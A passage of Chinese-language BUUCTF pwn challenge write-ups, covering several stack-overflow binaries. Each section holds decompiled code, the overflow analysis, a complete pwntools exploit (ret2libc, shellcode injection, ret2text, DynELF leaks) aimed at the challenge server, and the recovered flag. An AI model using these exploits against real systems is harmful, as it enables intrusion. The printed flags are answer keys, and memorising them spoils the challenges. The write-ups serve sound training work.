┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_en_2 --only "pop|ret"  
Gadgets information
============================================================
0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c80 : pop r14 ; pop r15 ; ret
0x0000000000400c82 : pop r15 ; ret
0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop rbp ; ret
0x0000000000400aec : pop rbx ; pop rbp ; ret
0x0000000000400c83 : pop rdi ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b9 : ret
0x00000000004008ca : ret 0x2017
0x0000000000400962 : ret 0x458b
0x00000000004009c5 : ret 0xbf02

Unique gadgets found: 15
```

编写`Python`代码求解，得到`flag{17e9c174-32c6-4b4e-b10b-808e1e6ee482}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26769)
elf = ELF('./ciscn_2019_en_2')
pop_rdi = 0x400c83 # pop rdi; ret
ret = 0x4006b9 # ret
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.sendlineafter(b'Input your choice!', b'1')
payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.recvuntil(b'Ciphertext\n')
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info('puts_address => 0x%x', puts_addr)
libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.interactive()
```

------

### [ciscn_2019_n_5](https://buuoj.cn/challenges#ciscn_2019_n_5)

先`file ./ciscn_2019_n_5`查看文件类型再`checksec --file=./ciscn_2019_n_5`检查文件保护情况。`NX disabled`栈可执行。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_n_5
./ciscn_2019_n_5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e420b4efe941251c692c93a7089b49b4319f891, with debug_info, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_n_5
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_n_5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开附件`ciscn_2019_n_5`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("tell me your name");
  read(0, name, 0x64uLL);
  puts("wow~ nice name!");
  puts("What do you want to say to me?");
  gets(text);
  return 0;
}
```

`name`变量是直接存储在`.bss`段上的，首地址为`0x601080`。我们可以通过`name`变量把`shellcode`直接写入到`.bss`段中。

```assembly
.bss:0000000000601080 name            db 64h dup(?)           ; DATA XREF: main+35↑o
.bss:00000000006010E4                 align 8
.bss:00000000006010E4 _bss            ends
```

`text`变量的可用栈大小为`0x20`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。双击`text`变量查看其栈结构，需要用`0x20`个字节来覆盖`padding`，还需要`0x8`个字节来覆盖到栈帧。

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 text            db 30 dup(?)
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

我们可以通过这个栈溢出漏洞劫持程序控制流去执行刚刚写入到`.bss`段中的`shellcode`。

编写`Python`代码求解，得到`flag{f3eef899-2d9e-4f87-9ebe-d19d0edffc77}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28021)
bss_addr = 0x601080 # name
shellcode = asm(shellcraft.sh())
io.sendlineafter(b'tell me your name', shellcode)
payload = b'a'*(0x20+0x8) + p64(bss_addr)
io.sendlineafter(b'What do you want to say to me?', payload)
io.interactive()
```

------

### [ciscn_2019_ne_5](https://buuoj.cn/challenges#ciscn_2019_ne_5)

先`file ./ciscn_2019_ne_5`查看文件类型再`checksec --file=./ciscn_2019_ne_5`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_ne_5
./ciscn_2019_ne_5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6482843cea0a0b348169075298025f13ef6c6ec2, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_ne_5
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_ne_5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`./ciscn_2019_ne_5`后按`F5`反汇编源码并查看主函数，可以看到`admin`的密码是`administrator`。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-100h] BYREF
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
  char v8[96]; // [esp+88h] [ebp-78h] BYREF
  int *v9; // [esp+F4h] [ebp-Ch]

  v9 = &argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 48;
  memset(v6, 0, sizeof(v6));
  puts("Welcome to use LFS.");
  printf("Please input admin password:");
  __isoc99_scanf("%100s", s1);
  if ( strcmp(s1, "administrator") )      // admin登录密码是明文存储的
  {
    puts("Password Error!");
    exit(0);
  }
  puts("Welcome!");
  puts("Input your operation:");
  puts("1.Add a log.");
  puts("2.Display all logs.");
  puts("3.Print all logs.");
  printf("0.Exit\n:");
  __isoc99_scanf("%d", &v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 2:
      Display(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
    default:
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
}
```

双击`AddLog(src);`查看函数详情，有个`scanf`函数。

```c
int __cdecl AddLog(int a1)
{
  printf("Please input new log info:");
  return __isoc99_scanf("%128s", a1);
}
```

双击`Display(src);`查看函数详情，返回值是直接调用了`puts`函数。

```c
int __cdecl Display(char *s)
{
  return puts(s);
}
```

双击`Print();`查看函数详情，可以得知程序中存在系统调用函数`system`，通过`elf.symbols['system']`可获得`system`的函数地址。

```c
int Print()
{
  return system("echo Printing......");
}
```

双击`GetFlag();`查看函数详情，`dest`直接拷贝`AddLog`中的实参`src`，`dest`需要`0x48`个字节填满`padding`，覆盖到栈帧还需`4`字节。

```c
int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf("The flag is your log:%s\n", dest);
}
```

用`ROPgadget`查询`"/bin/sh"`字符串未果，但是可以找到`"sh"`字符串。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "/bin/sh"
Strings information
============================================================

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"         
Strings information
============================================================
0x080482ea : sh
```

编写`Python`代码进行求解可以得到`flag{e911a4b9-c3d7-4737-93ca-2ff81cfc04f0}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29145)
elf = ELF('./ciscn_2019_ne_5')
system_addr = elf.symbols['system']
sh_addr = 0x80482ea # ROPgadget --binary ./ciscn_2019_ne_5 --string "sh"
exit_addr = elf.symbols['exit']
io.sendlineafter(b'Please input admin password:', 'administrator')
payload = b'a'*(0x48+0x4) + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
io.sendlineafter(b'Exit\n:', '1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'Exit\n:', '4')
io.interactive()
```

------

### [jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)

先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level4         
./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level4         
[*] '/home/tyd/ctf/pwn/buuctf/level4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  return read(0, buf, 0x100u);
}
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。

编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25533)
elf = ELF('./level4')
main_addr = elf.symbols['main']  # 0x8048470
write_plt = elf.plt['write']  # 0x8048340
read_plt = elf.plt['read']  # 0x8048310
bss_addr = elf.bss()  # 0x804a024
padding = b'a'*(0x88+0x4)

def leak(address):
    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### bjdctf_2020_babystack2

先`file ./bjdctf_2020_babystack2 `查看文件类型，再`checksec --file=./bjdctf_2020_babystack2 `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./bjdctf_2020_babystack2           
./bjdctf_2020_babystack2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98383c4b37ec43aae16b46971bd5ead3f03ce0a6, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./bjdctf_2020_babystack2
[*] '/home/tyd/ctf/pwn/buuctf/bjdctf_2020_babystack2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`NX enabled`开启栈不可执行，用`IDA Pro 64bit`打开附件`./bjdctf_2020_babystack2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

程序首先输入`size_t`型的`nbytes`，如果这个无符号整数强制转换成`int`型后大于`10`就终止程序，否则`nbytes`为下一次输入的最大长度限制。`read`函数向`buf`变量中写入不超过`nbytes`字节的数据，存在栈溢出漏洞。在`Functions window`中看到后门函数`backdoor`。

```assembly
public backdoor
backdoor proc near
; __unwind {
push    rbp
mov     rbp, rsp
mov     edi, offset command ; "/bin/sh"
call    _system
mov     eax, 1
pop     rbp
retn
; } // starts at 400726
backdoor endp
```

当第一次输入`-1`时就能造成栈溢出漏洞，编写`Python`代码求解得到`flag{8cdd2ef8-b593-4974-8dcf-a8eb632145e6}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29944)
elf = ELF('./bjdctf_2020_babystack2')
backdoor = elf.symbols['backdoor']
io.recv()
io.sendline(b'-1')
payload = b'a'*0x18 + p64(backdoor)
io.sendlineafter(b"[+]What's u name?", payload)
io.interactive()
```

------

### pwn2_sctf_2016

先`file ./pwn2_sctf_2016`查看文件类型，再`checksec --file=./pwn2_sctf_2016`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./pwn2_sctf_2016
./pwn2_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b6d53bc9aca0e73953173f153dc75bd540d6a48, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./pwn2_sctf_2016
[*] '/home/tyd/ctf/pwn/buuctf/pwn2_sctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`NX enabled`开启栈中不可执行，可能是`ret2shellcode`或`ret2libc`。用`IDA Pro 32bit`打开附件`./pwn2_sctf_2016`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  return vuln();
}
```

双击`vuln()`函数查看详情：

```c
int vuln()
{
  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  get_n(nptr, 4);
  v2 = atoi(nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  get_n(nptr, v2);
  return printf("You said: %s\n", nptr);
}
```

当`get_n()`获取的`nptr`大于`32`时会退出程序，双击`get_n()`函数查看详情：

```c
int __cdecl get_n(int a1, unsigned int a2)
{
  unsigned int v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || i >= a2 )
      break;
    v2 = i;
    *(_BYTE *)(v2 + a1) = v4;
  }
  result = a1 + i;
  *(_BYTE *)(a1 + i) = 0;
  return result;
}
```

在`32`位有符号整型`int`中，`-1`在计算机中的值为**11111111 11111111 11111111 11111111 = 0xFFFFFFFF**，而这个数值在`32`位无符号整型`unsigned int`中的十进制值为**4294967295**，因此我们可以用`-1`来绕过`if ( v2 > 32 )`这个判断条件，并且构造了栈溢出漏洞。`Functions window`中没有`system()`函数和`"/bin/sh"`，重新审计`vuln()`函数，我们可以利用`printf`函数来泄露`libc`版本，从而计算出`system()`函数和`"/bin/sh"`的地址，然后利用栈溢出漏洞劫持程序去执行。编写`Python`代码求解，然而`LibcSearcher`打不通。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26660)
elf = ELF('./pwn2_sctf_2016')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.recvline()
printf_addr = u32(io.recv(4))
log.info('printf_address => %s', hex(printf_addr))
libc = LibcSearcher('printf', printf_addr)
libcbase = printf_addr - libc.dump('printf')
log.success('printf_address => %s', hex(printf_addr))
system_addr = libcbase + libc.dump('system')
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.info('bin_sh_address => %s', hex(bin_sh_addr))
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.interactive()
```

找了个`libc_32.so.6`打通了，得到`flag{83a8a45c-8540-4a09-9e84-38bb8824835d}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26660)
elf = ELF('./pwn2_sctf_2016')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.recvline()
printf_addr = u32(io.recv(4))
log.info('printf_address => %s', hex(printf_addr))
libc = ELF('./libc_32.so.6')
libcbase = printf_addr - libc.symbols['printf']
log.success('printf_address => %s', hex(printf_addr))
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.interactive()
```

------

### not_the_same_3dsctf_2016

先`file ./not_the_same_3dsctf_2016`查看文件类型，再`checksec --file=./not_the_same_3dsctf_2016`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./not_the_same_3dsctf_2016
./not_the_same_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./not_the_same_3dsctf_2016
[*] '/home/tyd/ctf/pwn/buuctf/not_the_same_3dsctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`./not_the_same_3dsctf_2016`，按`F5`反汇编源码并查看主函数。发现`gets()`函数读取输入到变量`v4`中，`v4`的长度有`0x2D`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}
```

在`Functions window`中看到后门函数`get_secret`。

```c
int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

首先我们可以利用栈溢出漏洞，劫持程序跳转至后门函数`get_secret`，读取`flag.txt`中的内容到`fl4g`，返回到主函数后再次利用栈溢出漏洞和程序内的`write`函数，读取`fl4g`中的内容。编写`Python`代码求解得到`flag{be1e304b-8a02-4cda-b3dd-54fbdca25619}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
elf = ELF('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn', 26057)
main = elf.sym['main'] # 0x80489E0
get_secret = elf.sym['get_secret'] # 0x80489A0
fl4g = 0x80ECA2D
write = elf.sym['write'] # 0x806E270
offset = 0x2d
payload = b'a'*offset + p32(get_secret) + p32(main)
io.sendline(payload)
payload = b'a'*offset + p32(write) + p32(main) + p32(1) + p32(fl4g) + p32(offset)
io.sendline(payload)
io.interactive()
```

------

### ret2text

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
└─$ file ./pwn           
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=91958f3de15439a5e19498ff6c24650656401015, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2text/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  puts("Welcome!May I have your name?");
  __isoc99_scanf("%s", v4);
  puts("Ok.See you!");
  return 0;
}
```

存在栈溢出漏洞，双击`v4`变量查看栈结构：

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 var_20          db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

注意到`Functions window`中有个`backdooOo0r()`函数，其返回值直接执行了`/bin/sh`。

```c
int backdooOo0r()
{
  return execve("/bin/sh", 0LL, 0LL);
}
```

编写`Python`代码求解得到`flag{8c05c222-e73e-4f15-b977-a26310b808e5}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28674)
elf = ELF('./pwn')
backdoor = elf.symbols['backdooOo0r']
payload = b'a'*(0x20+0x8) + p64(backdoor)
io.sendline(payload)
io.interactive()
```

------

### calc

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/calc]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5aeaa15b87f358f1145d4c7b9d226d51df696cf1, stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/calc]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/calc/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_C1B(a1, a2, a3);
  sub_B3A();
  sub_CE1();
  return 0LL;
}
```

双击`sub_B3A`函数查看详情：

```c
int sub_B3A()
{
  puts("Welcome to NewStarCTF!\nCan you make a calculator to slove 100 math calculations in 30 seconds?!");
  return puts("Enjoy it!");
}
```

`30`秒内算`100`道加减乘除题，挺有意思。双击`sub_CE1`函数查看详情：

```c
void __fastcall sub_CE1(const char *a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  char v4; // [rsp+Fh] [rbp-21h]
  int v5; // [rsp+10h] [rbp-20h] BYREF
  int v6; // [rsp+14h] [rbp-1Ch]
  int v7; // [rsp+18h] [rbp-18h]
  int i; // [rsp+1Ch] [rbp-14h]
  int v9; // [rsp+20h] [rbp-10h]
  int v10; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v11; // [rsp+28h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v5 = 0;
  v6 = 0;
  v7 = 100;
  for ( i = 0; i <= 99; ++i )
  {
    v1 = time(0LL);
    srand(v1 * (i + 114));
    v9 = rand() % 1919 + 1;
    v2 = time(0LL);
    srand(v2 * (i + 514));
    v10 = rand() % 810 + 1;
    v3 = time(0LL);
    srand(v3 * (i + 1919810));
    v4 = byte_202010[rand() % 3];
    printf("What's the answer? %d %c %d = what?\n", (unsigned int)v9, (unsigned int)v4, (unsigned int)v10);
    __isoc99_scanf("%d", &v5);
    if ( v4 == 45 )
    {
      v6 = v9 - v10;
    }
    else if ( v4 > 45 )
    {
      if ( v4 == 47 )
      {
        v6 = v9 / v10;
      }
      else if ( v4 == 120 )
      {
        v6 = v10 * v9;
      }
    }
    else if ( v4 == 43 )
    {
      v6 = v9 + v10;
    }
    if ( v6 != v5 )
    {
      handler((int)"%d");
      return;
    }
    a1 = "Right! Next!";
    puts("Right! Next!");
    --v7;
  }
  if ( v7 )
    handler((int)a1);
  else
    sub_BE9();
}
```

编写`Python`代码求解，算完100道算术题后，`cat flag`可得`flag{e1a1007a-ee74-4a32-b819-51249594c4fa}`。

```python
from pwn import *

def cal(x, y, opertor):
    if opertor == '+':
        return x+y
    elif opertor == '-':
        return x-y
    elif opertor == 'x':
        return x*y
    elif opertor == '/':
        return x/y
    else:
        return 0

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25690)
elf = ELF('./pwn')
for i in range(100):
    io.recvuntil(b"What's the answer? ")
    n1 = int(io.recvuntil(b' '))
    oper = io.recvuntil(b' ')[:-1].decode()
    n2 = int(io.recvuntil(b' =')[:-2])
    n = cal(n1, n2, oper)
    io.sendline(str(n).encode())
    log.success('%d %c %d = %d' % (n1, oper, n2, n))

io.interactive()
```

------

### ret2libc

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
└─$ file ./pwn
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a55aea407e818c5b33f682baba13f279efc2502, not stripped
                                                                                                                                                 
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2libc/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
